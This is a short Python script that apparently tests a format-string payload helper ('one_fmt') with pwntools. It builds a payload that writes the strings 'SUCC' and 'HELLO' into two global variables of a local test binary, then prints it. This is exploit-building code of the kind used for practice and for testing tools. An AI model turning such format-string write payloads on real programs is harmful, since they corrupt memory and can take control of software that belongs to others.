from one_fmt import *
from pwn import *

elf = ELF("./test3", checksec=False)

fmt = Fmt(6)
fmt[elf.symbols["target1"]] = "SUCC\x00\x00\x00\x00"
fmt[elf.symbols["target2"]] = "HELLO"

print fmt.build(2)
